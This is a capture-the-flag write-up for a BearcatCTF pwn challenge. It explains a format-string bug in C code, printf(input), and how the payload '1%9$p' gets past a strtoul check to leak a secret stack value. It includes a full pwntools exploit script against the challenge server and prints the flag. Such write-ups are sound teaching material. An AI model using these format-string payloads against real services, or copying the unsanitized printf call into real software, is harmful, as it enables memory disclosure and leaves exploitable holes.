#Pwn 
## Vulnerability Analysis

The core of the program is in the `main` and `get_guess` functions. The program generates a random 64-bit number, `secret_num`, and gives the user two chances to guess it.

```c
// spyglass.c

unsigned long get_guess(){
    char input[22];
    unsigned long guess;
    printf("Enter your guess (between 1 and 18446744073709551615): ");
    fgets(input, sizeof(input), stdin);
    guess = strtoul(input, NULL, 0);
    if (!guess){
        printf("Guess not allowed %s
", input);
        return 0;
    }
    printf(input); // <-- FORMAT STRING VULNERABILITY
    printf("What an interesting guess...
");
    return guess;
}

int main() {
    unsigned long guess;
    unsigned long secret_num = get_secure_random();
   
    setvbuf(stdout, NULL, _IONBF, 0);

    guess = get_guess();

    if (guess == secret_num){
        //... print_flag() ...
    }
    
    // ... second guess ...
}
```

The key vulnerability is a **format string bug** in the `get_guess` function: `printf(input);`. The user-provided input is passed directly as the format string argument to `printf`. This allows us to read arbitrary data from the stack.

The `secret_num` is a local variable on the stack of the `main` function. When `get_guess` is called, `secret_num` resides at a predictable offset on the stack relative to the `printf` call's stack frame. We can use a format string payload like `%N$p` to leak this value.

### The Challenge

A simple payload like `%p` or `%9$p` would not work. The `get_guess` function first converts the user input to an `unsigned long` using `strtoul(input, NULL, 0)`. If the result is `0` (which happens if the input string does not start with a digit), the function prints an error and returns `0` immediately, **before** the vulnerable `printf(input)` call is reached.

This meant any payload that started with a non-digit character (like `%`) would fail to trigger the vulnerability.

## Exploitation Strategy

To bypass the `strtoul` check and trigger the vulnerability, the payload needed to satisfy two conditions:
1.  It must start with a non-zero digit to be parsed as a non-zero number by `strtoul`.
2.  It must contain a format string specifier to leak the secret.

The solution was to combine these into a single payload: `1%9$p`.

1.  **Bypassing the check:** `strtoul("1%9$p", NULL, 0)` parses the initial `1` and stops at the first non-digit character (`%`). It successfully returns the value `1`. Since `1 != 0`, the `if (!guess)` block is skipped.
2.  **Leaking the secret:** The program proceeds to `printf("1%9$p");`. `printf` prints the literal `1` and then interprets `%9$p`, which leaks the value of the 9th argument on the stack—our `secret_num`—in hexadecimal format.
3.  **Capturing the flag:** The script reads the output, parses the hexadecimal value, converts it to an integer, and sends it back as the second guess. The server confirms the guess is correct and provides the flag.

## Final Exploit Script

The following Python script using `pwntools` automates this process.

```python
from pwn import *

# Connect to the remote server
p = remote('chal.bearcatctf.io', 20011)

# --- First guess: Leak the secret ---

# Wait for the first prompt
p.recvuntil(b'Enter your guess (between 1 and 18446744073709551615): ')

# We need a payload that starts with a digit for strtoul, but also has a format string.
# '1%9$p' will be read as '1' by strtoul, but printf will process the whole thing.
# The offset 9 was found by trial and error (it's a common one).
payload = b'1%9$p'
p.sendline(payload)

# The output will be our payload, which printf interprets.
# It will print '1' followed by the hex value.
# e.g., "10x7ffc12345678What an interesting guess...
"
leaked_output = p.recvuntil(b'What an interesting guess...
')

# Find the '0x' to locate the start of the real hex value
try:
    hex_start_index = leaked_output.index(b'0x')
    # The hex string is from '0x' until the end of the interesting part
    leaked_part = leaked_output[hex_start_index:]
    leaked_hex = leaked_part.split(b'What')[0].strip()

    secret = int(leaked_hex, 16)
    print(f"Leaked secret value (hex): {leaked_hex.decode()}")
    print(f"Leaked secret value (int): {secret}")

    # --- Second guess: Send the secret back ---

    # The program asks for a second guess
    p.recvuntil(b'Enter your guess (between 1 and 18446744073709551615): ')

    # Send the leaked secret as the guess.
    p.sendline(str(secret).encode('utf-8'))

    # Now we should get the flag
    response = p.recvall(timeout=2)
    print(response.decode())

except ValueError:
    print("Failed to leak the secret, '0x' not found in output.")
    print(f"Received: {leaked_output.decode()}")

p.close()
```

## Conclusion

Running the exploit script successfully leaked the secret number on the first attempt and sent it back on the second, revealing the flag.

**Flag:** `BCCTF{I_spY_W1th_My_L177L3_eY3...}`
